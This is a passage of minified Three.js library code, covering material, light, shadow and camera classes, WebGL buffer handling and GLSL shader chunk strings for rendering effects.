Wr{constructor(e){super(),this.isMeshDepthMaterial=!0,this.type="MeshDepthMaterial",this.depthPacking=cw,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.setValues(e)}copy(e){return super.copy(e),this.depthPacking=e.depthPacking,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this}}class Qw extends Wr{constructor(e){super(),this.isMeshDistanceMaterial=!0,this.type="MeshDistanceMaterial",this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.setValues(e)}copy(e){return super.copy(e),this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this}}class _h extends Gt{constructor(e,n=1){super(),this.isLight=!0,this.type="Light",this.color=new Ie(e),this.intensity=n}dispose(){this.dispatchEvent({type:"dispose"})}copy(e,n){return super.copy(e,n),this.color.copy(e.color),this.intensity=e.intensity,this}toJSON(e){const n=super.toJSON(e);return n.object.color=this.color.getHex(),n.object.intensity=this.intensity,n}}const pu=new _t,Mm=new B,Em=new B;class a_{constructor(e){this.camera=e,this.intensity=1,this.bias=0,this.normalBias=0,this.radius=1,this.blurSamples=8,this.mapSize=new et(512,512),this.mapType=Sn,this.map=null,this.mapPass=null,this.matrix=new _t,this.autoUpdate=!0,this.needsUpdate=!1,this._frustum=new gh,this._frameExtents=new et(1,1),this._viewportCount=1,this._viewports=[new Mt(0,0,1,1)]}getViewportCount(){return this._viewportCount}getFrustum(){return this._frustum}updateMatrices(e){const n=this.camera,i=this.matrix;Mm.setFromMatrixPosition(e.matrixWorld),n.position.copy(Mm),Em.setFromMatrixPosition(e.target.matrixWorld),n.lookAt(Em),n.updateMatrixWorld(),pu.multiplyMatrices(n.projectionMatrix,n.matrixWorldInverse),this._frustum.setFromProjectionMatrix(pu,n.coordinateSystem,n.reversedDepth),n.reversedDepth?i.set(.5,0,0,.5,0,.5,0,.5,0,0,1,0,0,0,0,1):i.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,0,0,0,1),i.multiply(pu)}getViewport(e){return this._viewports[e]}getFrameExtents(){return this._frameExtents}dispose(){this.map&&this.map.dispose(),this.mapPass&&this.mapPass.dispose()}copy(e){return this.camera=e.camera.clone(),this.intensity=e.intensity,this.bias=e.bias,this.radius=e.radius,this.autoUpdate=e.autoUpdate,this.needsUpdate=e.needsUpdate,this.normalBias=e.normalBias,this.blurSamples=e.blurSamples,this.mapSize.copy(e.mapSize),this}clone(){return new this.constructor().copy(this)}toJSON(){const e={};return this.intensity!==1&&(e.intensity=this.intensity),this.bias!==0&&(e.bias=this.bias),this.normalBias!==0&&(e.normalBias=this.normalBias),this.radius!==1&&(e.radius=this.radius),(this.mapSize.x!==512||this.mapSize.y!==512)&&(e.mapSize=this.mapSize.toArray()),e.camera=this.camera.toJSON(!1).object,delete e.camera.matrix,e}}class eM extends a_{constructor(){super(new un(90,1,.5,500)),this.isPointLightShadow=!0}}class o_ extends _h{constructor(e,n,i=0,s=2){super(e,n),this.isPointLight=!0,this.type="PointLight",this.distance=i,this.decay=s,this.shadow=new eM}get power(){return this.intensity*4*Math.PI}set power(e){this.intensity=e/(4*Math.PI)}dispose(){super.dispose(),this.shadow.dispose()}copy(e,n){return super.copy(e,n),this.distance=e.distance,this.decay=e.decay,this.shadow=e.shadow.clone(),this}toJSON(e){const n=super.toJSON(e);return n.object.distance=this.distance,n.object.decay=this.decay,n.object.shadow=this.shadow.toJSON(),n}}class xh extends e_{constructor(e=-1,n=1,i=1,s=-1,r=.1,a=2e3){super(),this.isOrthographicCamera=!0,this.type="OrthographicCamera",this.zoom=1,this.view=null,this.left=e,this.right=n,this.top=i,this.bottom=s,this.near=r,this.far=a,this.updateProjectionMatrix()}copy(e,n){return super.copy(e,n),this.left=e.left,this.right=e.right,this.top=e.top,this.bottom=e.bottom,this.near=e.near,this.far=e.far,this.zoom=e.zoom,this.view=e.view===null?null:Object.assign({},e.view),this}setViewOffset(e,n,i,s,r,a){this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=n,this.view.offsetX=i,this.view.offsetY=s,this.view.width=r,this.view.height=a,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const e=(this.right-this.left)/(2*this.zoom),n=(this.top-this.bottom)/(2*this.zoom),i=(this.right+this.left)/2,s=(this.top+this.bottom)/2;let r=i-e,a=i+e,o=s+n,l=s-n;if(this.view!==null&&this.view.enabled){const c=(this.right-this.left)/this.view.fullWidth/this.zoom,d=(this.top-this.bottom)/this.view.fullHeight/this.zoom;r+=c*this.view.offsetX,a=r+c*this.view.width,o-=d*this.view.offsetY,l=o-d*this.view.height}this.projectionMatrix.makeOrthographic(r,a,o,l,this.near,this.far,this.coordinateSystem,this.reversedDepth),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(e){const n=super.toJSON(e);return n.object.zoom=this.zoom,n.object.left=this.left,n.object.right=this.right,n.object.top=this.top,n.object.bottom=this.bottom,n.object.near=this.near,n.object.far=this.far,this.view!==null&&(n.object.view=Object.assign({},this.view)),n}}class tM extends a_{constructor(){super(new xh(-5,5,5,-5,.5,500)),this.isDirectionalLightShadow=!0}}class l_ extends _h{constructor(e,n){super(e,n),this.isDirectionalLight=!0,this.type="DirectionalLight",this.position.copy(Gt.DEFAULT_UP),this.updateMatrix(),this.target=new Gt,this.shadow=new tM}dispose(){super.dispose(),this.shadow.dispose()}copy(e){return super.copy(e),this.target=e.target.clone(),this.shadow=e.shadow.clone(),this}toJSON(e){const n=super.toJSON(e);return n.object.shadow=this.shadow.toJSON(),n.object.target=this.target.uuid,n}}class c_ extends _h{constructor(e,n){super(e,n),this.isAmbientLight=!0,this.type="AmbientLight"}}class nM extends un{constructor(e=[]){super(),this.isArrayCamera=!0,this.isMultiViewCamera=!1,this.cameras=e}}class u_{constructor(e=!0){this.autoStart=e,this.startTime=0,this.oldTime=0,this.elapsedTime=0,this.running=!1}start(){this.startTime=performance.now(),this.oldTime=this.startTime,this.elapsedTime=0,this.running=!0}stop(){this.getElapsedTime(),this.running=!1,this.autoStart=!1}getElapsedTime(){return this.getDelta(),this.elapsedTime}getDelta(){let e=0;if(this.autoStart&&!this.running)return this.start(),0;if(this.running){const n=performance.now();e=(n-this.oldTime)/1e3,this.oldTime=n,this.elapsedTime+=e}return e}}class iM extends Yw{constructor(e=10,n=10,i=4473924,s=8947848){i=new Ie(i),s=new Ie(s);const r=n/2,a=e/n,o=e/2,l=[],c=[];for(let h=0,f=0,_=-o;h<=n;h++,_+=a){l.push(-o,0,_,o,0,_),l.push(_,0,-o,_,0,o);const y=h===r?i:s;y.toArray(c,f),f+=3,y.toArray(c,f),f+=3,y.toArray(c,f),f+=3,y.toArray(c,f),f+=3}const d=new An;d.setAttribute("position",new kt(l,3)),d.setAttribute("color",new kt(c,3));const p=new s_({vertexColors:!0,toneMapped:!1});super(d,p),this.type="GridHelper"}dispose(){this.geometry.dispose(),this.material.dispose()}}function Tm(t,e,n,i){const s=sM(i);switch(n){case H0:return t*e;case W0:return t*e/s.components*s.byteLength;case ch:return t*e/s.components*s.byteLength;case Ur:return t*e*2/s.components*s.byteLength;case uh:return t*e*2/s.components*s.byteLength;case G0:return t*e*3/s.components*s.byteLength;case jn:return t*e*4/s.components*s.byteLength;case dh:return t*e*4/s.components*s.byteLength;case ll:case cl:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*8;case ul:case dl:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*16;case Cd:case Pd:return Math.max(t,16)*Math.max(e,8)/4;case Ad:case Rd:return Math.max(t,8)*Math.max(e,8)/2;case Ld:case kd:case Dd:case Id:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*8;case Nd:case Ud:case Od:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*16;case Fd:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*16;case Bd:return Math.floor((t+4)/5)*Math.floor((e+3)/4)*16;case zd:return Math.floor((t+4)/5)*Math.floor((e+4)/5)*16;case Vd:return Math.floor((t+5)/6)*Math.floor((e+4)/5)*16;case Hd:return Math.floor((t+5)/6)*Math.floor((e+5)/6)*16;case Gd:return Math.floor((t+7)/8)*Math.floor((e+4)/5)*16;case Wd:return Math.floor((t+7)/8)*Math.floor((e+5)/6)*16;case jd:return Math.floor((t+7)/8)*Math.floor((e+7)/8)*16;case Xd:return Math.floor((t+9)/10)*Math.floor((e+4)/5)*16;case qd:return Math.floor((t+9)/10)*Math.floor((e+5)/6)*16;case Yd:return Math.floor((t+9)/10)*Math.floor((e+7)/8)*16;case $d:return Math.floor((t+9)/10)*Math.floor((e+9)/10)*16;case Kd:return Math.floor((t+11)/12)*Math.floor((e+9)/10)*16;case Zd:return Math.floor((t+11)/12)*Math.floor((e+11)/12)*16;case Jd:case Qd:case ep:return Math.ceil(t/4)*Math.ceil(e/4)*16;case tp:case np:return Math.ceil(t/4)*Math.ceil(e/4)*8;case ip:case sp:return Math.ceil(t/4)*Math.ceil(e/4)*16}throw new Error(`Unable to determine texture byte length for ${n} format.`)}function sM(t){switch(t){case Sn:case F0:return{byteLength:1,components:1};case ja:case B0:case Li:return{byteLength:2,components:1};case oh:case lh:return{byteLength:2,components:4};case li:case ah:case ti:return{byteLength:4,components:1};case z0:case V0:return{byteLength:4,components:3}}throw new Error(`Unknown texture type ${t}.`)}typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("register",{detail:{revision:rh}}));typeof window<"u"&&(window.__THREE__?Ne("WARNING: Multiple instances of Three.js being imported."):window.__THREE__=rh);/**
 * @license
 * Copyright 2010-2025 Three.js Authors
 * SPDX-License-Identifier: MIT
 */function d_(){let t=null,e=!1,n=null,i=null;function s(r,a){n(r,a),i=t.requestAnimationFrame(s)}return{start:function(){e!==!0&&n!==null&&(i=t.requestAnimationFrame(s),e=!0)},stop:function(){t.cancelAnimationFrame(i),e=!1},setAnimationLoop:function(r){n=r},setContext:function(r){t=r}}}function rM(t){const e=new WeakMap;function n(o,l){const c=o.array,d=o.usage,p=c.byteLength,h=t.createBuffer();t.bindBuffer(l,h),t.bufferData(l,c,d),o.onUploadCallback();let f;if(c instanceof Float32Array)f=t.FLOAT;else if(typeof Float16Array<"u"&&c instanceof Float16Array)f=t.HALF_FLOAT;else if(c instanceof Uint16Array)o.isFloat16BufferAttribute?f=t.HALF_FLOAT:f=t.UNSIGNED_SHORT;else if(c instanceof Int16Array)f=t.SHORT;else if(c instanceof Uint32Array)f=t.UNSIGNED_INT;else if(c instanceof Int32Array)f=t.INT;else if(c instanceof Int8Array)f=t.BYTE;else if(c instanceof Uint8Array)f=t.UNSIGNED_BYTE;else if(c instanceof Uint8ClampedArray)f=t.UNSIGNED_BYTE;else throw new Error("THREE.WebGLAttributes: Unsupported buffer data format: "+c);return{buffer:h,type:f,bytesPerElement:c.BYTES_PER_ELEMENT,version:o.version,size:p}}function i(o,l,c){const d=l.array,p=l.updateRanges;if(t.bindBuffer(c,o),p.length===0)t.bufferSubData(c,0,d);else{p.sort((f,_)=>f.start-_.start);let h=0;for(let f=1;f<p.length;f++){const _=p[h],y=p[f];y.start<=_.start+_.count+1?_.count=Math.max(_.count,y.start+y.count-_.start):(++h,p[h]=y)}p.length=h+1;for(let f=0,_=p.length;f<_;f++){const y=p[f];t.bufferSubData(c,y.start*d.BYTES_PER_ELEMENT,d,y.start,y.count)}l.clearUpdateRanges()}l.onUploadCallback()}function s(o){return o.isInterleavedBufferAttribute&&(o=o.data),e.get(o)}function r(o){o.isInterleavedBufferAttribute&&(o=o.data);const l=e.get(o);l&&(t.deleteBuffer(l.buffer),e.delete(o))}function a(o,l){if(o.isInterleavedBufferAttribute&&(o=o.data),o.isGLBufferAttribute){const d=e.get(o);(!d||d.version<o.version)&&e.set(o,{buffer:o.buffer,type:o.type,bytesPerElement:o.elementSize,version:o.version});return}const c=e.get(o);if(c===void 0)e.set(o,n(o,l));else if(c.version<o.version){if(c.size!==o.array.byteLength)throw new Error("THREE.WebGLAttributes: The size of the buffer attribute's array buffer does not match the original size. Resizing buffer attributes is not supported.");i(c.buffer,o,l),c.version=o.version}}return{get:s,remove:r,update:a}}var aM=`#ifdef USE_ALPHAHASH
	if ( diffuseColor.a < getAlphaHashThreshold( vPosition ) ) discard;
#endif`,oM=`#ifdef USE_ALPHAHASH
	const float ALPHA_HASH_SCALE = 0.05;
	float hash2D( vec2 value ) {
		return fract( 1.0e4 * sin( 17.0 * value.x + 0.1 * value.y ) * ( 0.1 + abs( sin( 13.0 * value.y + value.x ) ) ) );
	}
	float hash3D( vec3 value ) {
		return hash2D( vec2( hash2D( value.xy ), value.z ) );
	}
	float getAlphaHashThreshold( vec3 position ) {
		float maxDeriv = max(
			length( dFdx( position.xyz ) ),
			length( dFdy( position.xyz ) )
		);
		float pixScale = 1.0 / ( ALPHA_HASH_SCALE * maxDeriv );
		vec2 pixScales = vec2(
			exp2( floor( log2( pixScale ) ) ),
			exp2( ceil( log2( pixScale ) ) )
		);
		vec2 alpha = vec2(
			hash3D( floor( pixScales.x * position.xyz ) ),
			hash3D( floor( pixScales.y * position.xyz ) )
		);
		float lerpFactor = fract( log2( pixScale ) );
		float x = ( 1.0 - lerpFactor ) * alpha.x + lerpFactor * alpha.y;
		float a = min( lerpFactor, 1.0 - lerpFactor );
		vec3 cases = vec3(
			x * x / ( 2.0 * a * ( 1.0 - a ) ),
			( x - 0.5 * a ) / ( 1.0 - a ),
			1.0 - ( ( 1.0 - x ) * ( 1.0 - x ) / ( 2.0 * a * ( 1.0 - a ) ) )
		);
		float threshold = ( x < ( 1.0 - a ) )
			? ( ( x < a ) ? cases.x : cases.y )
			: cases.z;
		return clamp( threshold , 1.0e-6, 1.0 );
	}
#endif`,lM=`#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, vAlphaMapUv ).g;
#endif`,cM=`#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,uM=`#ifdef USE_ALPHATEST
	#ifdef ALPHA_TO_COVERAGE
	diffuseColor.a = smoothstep( alphaTest, alphaTest + fwidth( diffuseColor.a ), diffuseColor.a );
	if ( diffuseColor.a == 0.0 ) discard;
	#else
	if ( diffuseColor.a < alphaTest ) discard;
	#endif
#endif`,dM=`#ifdef USE_ALPHATEST
	uniform float alphaTest;
#endif`,pM=`#ifdef USE_AOMAP
	float ambientOcclusion = ( texture2D( aoMap, vAoMapUv ).r - 1.0 ) * aoMapIntensity + 1.0;
	reflectedLight.indirectDiffuse *= ambientOcclusion;
	#if defined( USE_CLEARCOAT ) 
		clearcoatSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_SHEEN ) 
		sheenSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD )
		float dotNV = saturate( dot( geometryNormal, geometryViewDir ) );
		reflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.roughness );
	#endif
#endif`,hM=`#ifdef USE_AOMAP
	uniform sampler2D aoMap;
	uniform float aoMapIntensity;
#endif`,fM=`#ifdef USE_BATCHING
	#if ! defined( GL_ANGLE_multi_draw )
	#define gl_DrawID _gl_DrawID
	uniform int _gl_DrawID;
	#endif
	uniform highp sampler2D batchingTexture;
	uniform highp usampler2D batchingIdTexture;
	mat4 getBatchingMatrix( const in float i ) {
		int size = textureSize( batchingTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( batchingTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( batchingTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( batchingTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( batchingTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
	float getIndirectIndex( const in int i ) {
		int size = textureSize( batchingIdTexture, 0 ).x;
		int x = i % size;
		int y = i / size;
		return float( texelFetch( batchingIdTexture, ivec2( x, y ), 0 ).r );
	}
#endif
#ifdef USE_BATCHING_COLOR
	uniform sampler2D batchingColorTexture;
	vec3 getBatchingColor( const in float i ) {
		int size = textureSize( batchingColorTexture, 0 ).x;
		int j = int( i );
		int x = j % size;
		int y = j / size;
		return texelFetch( batchingColorTexture, ivec2( x, y ), 0 ).rgb;
	}
#endif`,mM=`#ifdef USE_BATCHING
	mat4 batchingMatrix = getBatchingMatrix( getIndirectIndex( gl_DrawID ) );
#endif`,gM=`vec3 transformed = vec3( position );
#ifdef USE_ALPHAHASH
	vPosition = vec3( position );
#endif`,vM=`vec3 objectNormal = vec3( normal );
#ifdef USE_TANGENT
	vec3 objectTangent = vec3( tangent.xyz );
#endif`,_M=`float G_BlinnPhong_Implicit( ) {
	return 0.25;
}
float D_BlinnPhong( const in float shininess, const in float dotNH ) {
	return RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );
}
vec3 BRDF_BlinnPhong( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float shininess ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( specularColor, 1.0, dotVH );
	float G = G_BlinnPhong_Implicit( );
	float D = D_BlinnPhong( shininess, dotNH );
	return F * ( G * D );
} // validated`,xM=`#ifdef USE_IRIDESCENCE
	const mat3 XYZ_TO_REC709 = mat3(
		 3.2404542, -0.9692660,  0.0556434,
		-1.5371385,  1.8760108, -0.2040259,
		-0.4985314,  0.0415560,  1.0572252
	);
	vec3 Fresnel0ToIor( vec3 fresnel0 ) {
		vec3 sqrtF0 = sqrt( fresnel0 );
		return ( vec3( 1.0 ) + sqrtF0 ) / ( vec3( 1.0 ) - sqrtF0 );
	}
	vec3 IorToFresnel0( vec3 transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - vec3( incidentIor ) ) / ( transmittedIor + vec3( incidentIor ) ) );
	}
	float IorToFresnel0( float transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - incidentIor ) / ( transmittedIor + incidentIor ));
	}
	vec3 evalSensitivity( float OPD, vec3 shift ) {
		float phase = 2.0 * PI * OPD * 1.0e-9;
		vec3 val = vec3( 5.4856e-13, 4.4201e-13, 5.2481e-13 );
		vec3 pos = vec3( 1.6810e+06, 1.7953e+06, 2.2084e+06 );
		vec3 var = vec3( 4.3278e+09, 9.3046e+09, 6.6121e+09 );
		vec3 xyz = val * sqrt( 2.0 * PI * var ) * cos( pos * phase + shift ) * exp( - pow2( phase ) * var );
		xyz.x += 9.7470e-14 * sqrt( 2.0 * PI * 4.5282e+09 ) * cos( 2.2399e+06 * phase + shift[ 0 ] ) * exp( - 4.5282e+09 * pow2( phase ) );
		xyz /= 1.0685e-7;
		vec3 rgb = XYZ_TO_REC709 * xyz;
		return rgb;
	}
	vec3 evalIridescence( float outsideIOR, float eta2, float cosTheta1, float thinFilmThickness, vec3 baseF0 ) {
		vec3 I;
		float iridescenceIOR = mix( outsideIOR, eta2, smoothstep( 0.0, 0.03, thinFilmThickness ) );
		float sinTheta2Sq = pow2( outsideIOR / iridescenceIOR ) * ( 1.0 - pow2( cosTheta1 ) );
		float cosTheta2Sq = 1.0 - sinTheta2Sq;
		if ( cosTheta2Sq < 0.0 ) {
			return vec3( 1.0 );
		}
		float cosTheta2 = sqrt( cosTheta2Sq );
		float R0 = IorToFresnel0( iridescenceIOR, outsideIOR );
		float R12 = F_Schlick( R0, 1.0, cosTheta1 );
		float T121 = 1.0 - R12;
		float phi12 = 0.0;
		if ( iridescenceIOR < outsideIOR ) phi12 = PI;
		float phi21 = PI - phi12;
		vec3 baseIOR = Fresnel0ToIor( clamp( baseF0, 0.0, 0.9999 ) );		vec3 R1 = IorToFresnel0( baseIOR, iridescenceIOR );
		vec3 R23 = F_Schlick( R1, 1.0, cosTheta2 );
		vec3 phi23 = vec3( 0.0 );
		if ( baseIOR[ 0 ] < iridescenceIOR ) phi23[ 0 ] = PI;
		if ( baseIOR[ 1 ] < iridescenceIOR ) phi23[ 1 ] = PI;
		if ( baseIOR[ 2 ] < iridescenceIOR ) phi23[ 2 ] = PI;
		float OPD = 2.0 * iridescenceIOR * thinFilmThickness * cosTheta2;
		vec3 phi = vec3( phi21 ) + phi23;
		vec3 R123 = clamp( R12 * R23, 1e-5, 0.9999 );
		vec3 r123 = sqrt( R123 );
		vec3 Rs = pow2( T121 ) * R23 / ( vec3( 1.0 ) - R123 );
		vec3 C0 = R12 + Rs;
		I = C0;
		vec3 Cm = Rs - T121;
		for ( int m = 1; m <= 2; ++ m ) {
			Cm *= r123;
			vec3 Sm = 2.0 * evalSensitivity( float( m ) * OPD, float( m ) * phi );
			I += Cm * Sm;
		}
		return max( I, vec3( 0.0 ) );
	}
#endif`,yM=`#ifdef USE_BUMPMAP
	uniform sampler2D bumpMap;
	uniform float bumpScale;
	vec2 dHdxy_fwd() {
		vec2 dSTdx = dFdx( vBumpMapUv );
		vec2 dSTdy = dFdy( vBumpMapUv );
		float Hll = bumpScale * texture2D( bumpMap, vBumpMapUv ).x;
		float dBx = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdx ).x - Hll;
		float dBy = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdy ).x - Hll;
		return vec2( dBx, dBy );
	}
	vec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy, float faceDirection ) {
		vec3 vSigmaX = normalize( dFdx( surf_pos.xyz ) );
		vec3 vSigmaY = normalize( dFdy( surf_pos.xyz ) );
		vec3 vN = surf_norm;
		vec3 R1 = cross( vSigmaY, vN );
		vec3 R2 = cross( vN, vSigmaX );
		float fDet = dot( vSigmaX, R1 ) * faceDirection;
		vec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );
		return normalize( abs( fDet ) * surf_norm - vGrad );
	}
#endif`,SM=`#if NUM_CLIPPING_PLANES > 0
	vec4 plane;
	#ifdef ALPHA_TO_COVERAGE
		float distanceToPlane, distanceGradient;
		float clipOpacity = 1.0;
		#pragma unroll_loop_start
		for ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {
			plane = clippingPlanes[ i ];
			distanceToPlane = - dot( vClipPosition, plane.xyz ) + plane.w;
			distanceGradient = fwidth( distanceToPlane ) / 2.0;
			clipOpacity *= smoothstep( - distanceGradient, distanceGradient, distanceToPlane );
			if ( clipOpacity == 0.0 ) discard;
		}
		#pragma unroll_loop_end
		#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES
			float unionClipOpacity = 1.0;
			#pragma unroll_loop_start
			for ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {
				plane = clippingPlanes[ i ];
				distanceToPlane = - dot( vClipPosition, plane.xyz ) + plane.w;
				distanceGradient = fwidth( distanceToPlane ) / 2.0;
				unionClipOpacity *= 1.0 - smoothstep( - distanceGradient, distanceGradient, distanceToPlane );
			}
			#pragma unroll_loop_end
			clipOpacity *= 1.0 - unionClipOpacity;
		#endif
		diffuseColor.a *= clipOpacity;
		if ( diffuseColor.a == 0.0 ) discard;
	#else
		#pragma unroll_loop_start
		for ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {
			plane = clippingPlanes[ i ];
			if ( dot( vClipPosition, plane.xyz ) > plane.w ) discard;
		}
		#pragma unroll_loop_end
		#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES
			bool clipped = true;
			#pragma unroll_loop_start
			for ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {
				plane = clippingPlanes[ i ];
				clipped = ( dot( vClipPosition, plane.xyz ) > plane.w ) && clipped;
			}
			#pragma unroll_loop_end
			if ( clipped ) discard;
		#endif
	#endif
#endif`,bM=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
	uniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];
#endif`,wM=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
#endif`,MM=`#if NUM_CLIPPING_PLANES > 0
	vClipPosition = - mvPosition.xyz;
#endif`,EM=`#if defined( USE_COLOR_ALPHA )
	diffuseColor *= vColor;
#elif defined( USE_COLOR )
	diffuseColor.rgb *= vColor;
#endif`,TM=`#if defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#elif defined( USE_COLOR )
	varying vec3 vColor;
#endif`,AM=`#if defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR ) || defined( USE_BATCHING_COLOR )
	varying vec3 vColor;
#endif`,CM=`#if defined( USE_COLOR_ALPHA )
	vColor = vec4( 1.0 );
#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR ) || defined( USE_BATCHING_COLOR )
	vColor = vec3( 1.0 );
#endif
#ifdef USE_COLOR
	vColor *= color;
#endif
#ifdef USE_INSTANCING_COLOR
	vColor.xyz *= instanceColor.xyz;
#endif
#ifdef USE_BATCHING_COLOR
	vec3 batchingColor = getBatchingColor( getIndirectIndex( gl_DrawID ) );
	vColor.xyz *= batchingColor.xyz;
#endif`,RM=`#define PI 3.141592653589793
#define PI2 6.283185307179586
#define PI_HALF 1.5707963267948966
#define RECIPROCAL_PI 0.3183098861837907
#define RECIPROCAL_PI2 0.15915494309189535
#define EPSILON 1e-6
#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
#define whiteComplement( a ) ( 1.0 - saturate( a ) )
float pow2( const in float x ) { return x*x; }
vec3 pow2( const in vec3 x ) { return x*x; }
float pow3( const in float x ) { return x*x*x; }
float pow4( const in float x ) { float x2 = x*x; return x2*x2; }
float max3( const in vec3 v ) { return max( max( v.x, v.y ), v.z ); }
float average( const in vec3 v ) { return dot( v, vec3( 0.3333333 ) ); }
highp float rand( const in vec2 uv ) {
	const highp float a = 12.9898, b = 78.233, c = 43758.5453;
	highp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );
	return fract( sin( sn ) * c );
}
#ifdef HIGH_PRECISION
	float precisionSafeLength( vec3 v ) { return length( v ); }
#else
	float precisionSafeLength( vec3 v ) {
		float maxComponent = max3( abs( v ) );
		return length( v / maxComponent ) * maxComponent;
	}
#endif
struct IncidentLight {
	vec3 color;
	vec3 direction;
	bool visible;
};
struct ReflectedLight {
	vec3 directDiffuse;
	vec3 directSpecular;
	vec3 indirectDiffuse;
	vec3 indirectSpecular;
};
#ifdef USE_ALPHAHASH
	varying vec3 vPosition;
#endif
vec3 transformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );
}
vec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );
}
bool isPerspectiveMatrix( mat4 m ) {
	return m[ 2 ][ 3 ] == - 1.0;
}
vec2 equirectUv( in vec3 dir ) {
	float u = atan( dir.z, dir.x ) * RECIPROCAL_PI2 + 0.5;
	float v = asin( clamp( dir.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;
	return vec2( u, v );
}
vec3 BRDF_Lambert( const in vec3 diffuseColor ) {
	return RECIPROCAL_PI * diffuseColor;
}
vec3 F_Schlick( const in vec3 f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
}
float F_Schlick( const in float f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
} // validated`,PM=`#ifdef ENVMAP_TYPE_CUBE_UV
	#define cubeUV_minMipLevel 4.0
	#define cubeUV_minTileSize 16.0
	float getFace( vec3 direction ) {
		vec3 absDirection = abs( direction );
		float face = - 1.0;
		if ( absDirection.x > absDirection.z ) {
			if ( absDirection.x > absDirection.y )
				face = direction.x > 0.0 ? 0.0 : 3.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		} else {
			if ( absDirection.z > absDirection.y )
				face = direction.z > 0.0 ? 2.0 : 5.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		}
		return face;
	}
	vec2 getUV( vec3 direction, float face ) {
		vec2 uv;
		if ( face == 0.0 ) {
			uv = vec2( direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 1.0 ) {
			uv = vec2( - direction.x, - direction.z ) / abs( direction.y );
		} else if ( face == 2.0 ) {
			uv = vec2( - direction.x, direction.y ) / abs( direction.z );
		} else if ( face == 3.0 ) {
			uv = vec2( - direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 4.0 ) {
			uv = vec2( - direction.x, direction.z ) / abs( direction.y );
		} else {
			uv = vec2( direction.x, direction.y ) / abs( direction.z );
		}
		return 0.5 * ( uv + 1.0 );
	}
	vec3 bilinearCubeUV( sampler2D envMap, vec3 direction, float mipInt ) {
		float face = getFace( direction );
		float filterInt = max( cubeUV_minMipLevel - mipInt, 0.0 );
